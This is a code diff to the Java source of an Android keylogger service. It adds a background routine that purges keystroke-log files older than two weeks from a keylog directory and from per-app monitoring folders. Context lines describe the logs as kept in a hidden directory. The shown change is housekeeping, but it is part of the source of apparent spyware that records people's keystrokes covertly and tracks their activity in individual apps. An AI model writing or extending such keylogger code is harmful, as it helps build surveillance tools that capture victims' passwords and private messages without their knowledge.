@@ -37,6 +37,8 @@ public class KeyloggerService {
 
     private static final String TAG = "KeyloggerService";
 
+    private static final long TWO_WEEKS_MS = 14L * 24L * 60L * 60L * 1000L;
+
     private final Context context;
     private final File    klDir;
 
@@ -47,6 +49,48 @@ public class KeyloggerService {
         // Hidden dir inside app's private internal storage
         this.klDir = new File(context.getFilesDir(), Constants.KEYLOG_DIR);
         if (!klDir.exists()) klDir.mkdirs();
+        // Purge stale keylog files on every service start (runs on a background thread).
+        new Thread(this::purgeOldKeylogs, "KeylogPurge").start();
+    }
+
+    /**
+     * Delete any keylog (.jsonl) files that are older than 2 weeks.
+     * Covers both the global directory and every per-app subdirectory.
+     */
+    private void purgeOldKeylogs() {
+        long cutoff = System.currentTimeMillis() - TWO_WEEKS_MS;
+
+        // 1. Global keylog directory
+        deleteOldInDir(klDir, cutoff);
+
+        // 2. Per-app keylog subdirectories  (.am/<pkg>/kl/)
+        File amDir = new File(context.getFilesDir(), Constants.APP_MONITOR_DIR);
+        if (amDir.exists()) {
+            File[] appDirs = amDir.listFiles(File::isDirectory);
+            if (appDirs != null) {
+                for (File appDir : appDirs) {
+                    File appKlDir = new File(appDir, "kl");
+                    if (appKlDir.exists()) {
+                        deleteOldInDir(appKlDir, cutoff);
+                    }
+                }
+            }
+        }
+    }
+
+    /** Delete all .jsonl files inside {@code dir} whose last-modified time is before {@code cutoff}. */
+    private void deleteOldInDir(File dir, long cutoff) {
+        File[] files = dir.listFiles(f -> f.getName().endsWith(".jsonl"));
+        if (files == null) return;
+        for (File f : files) {
+            if (f.lastModified() < cutoff) {
+                if (f.delete()) {
+                    Log.i(TAG, "Purged old keylog: " + f.getName());
+                } else {
+                    Log.w(TAG, "Failed to delete: " + f.getName());
+                }
+            }
+        }
     }
 
     // ── Enable / disable ────────────────────────────────────────────────
